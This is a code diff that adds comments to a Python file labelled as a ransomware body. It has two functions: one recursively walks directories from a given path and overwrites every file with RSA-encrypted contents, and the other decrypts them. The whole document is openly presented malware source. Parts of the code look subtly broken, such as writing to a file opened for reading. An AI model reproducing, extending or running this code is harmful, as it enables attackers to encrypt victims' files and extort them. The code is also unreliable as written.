@@ -4,11 +4,14 @@ from tkinter import *
 # Ransomware body:
 
 def recursive_encryption(path):
+    '''Search through all directories under a given starting point and
+       encrypt all files.
+    '''
     directoryList = []
-    if os.path.isdir(path):
-        if os.listdir(path):
-            for f in os.listdir(path):
-                if os.path.isfile(path + f):
+    if os.path.isdir(path):  # Check if directory exists.
+        if os.listdir(path):  # Check if directory is empty.
+            for f in os.listdir(path):  # For all items in the directory
+                if os.path.isfile(path + f):   # if item is a file, open, encrypt, then save.
                     abso = path + f
                     with open(abso) as fi:
                         contents = fi.read()
@@ -16,10 +19,10 @@ def recursive_encryption(path):
                         contents = contents.rstrip()
                         toWrite = RSA.main('encrypt', contents)
                         fi.write(toWrite)
-                else:
-                    directoryList.append(path + f)
-            if len(directoryList) > 0:
-                for i in directoryList:
+                else:                                 
+                    directoryList.append(path + f)    # If item is a directory, add it to a list.
+            if len(directoryList) > 0:  # The base case for recursion.
+                for i in directoryList: # for each item in the direcctory list, enter the directory and call the encryption function again.
                     os.chdir(i)
                     recursive_encryption(f"{i}/")
         else:
@@ -29,10 +32,10 @@ def recursive_encryption(path):
 
 def recursive_decryption(path):
     directoryList = []
-    if os.path.isdir(path):
-        if os.listdir(path):
-            for f in os.listdir(path):
-                if os.path.isfile(path + f):
+    if os.path.isdir(path): # Check if directory exists.
+        if os.listdir(path): # Check if directory is empty.
+            for f in os.listdir(path): # For all items in the directory
+                if os.path.isfile(path + f):   # If item is a file, open, decrpyt, then save
                     abso = path + f
                     with open(abso) as fi:
                         contents = fi.read()
@@ -41,7 +44,7 @@ def recursive_decryption(path):
                         toWrite = RSA.main('decrypt', contents)
                         fi.write(toWrite)
                 else:
-                    directoryList.append(path + f)
+                    directoryList.append(path + f)   # If item is a directory, add it to a list.
             if len(directoryList) > 0:
                 for i in directoryList:
                     os.chdir(i)
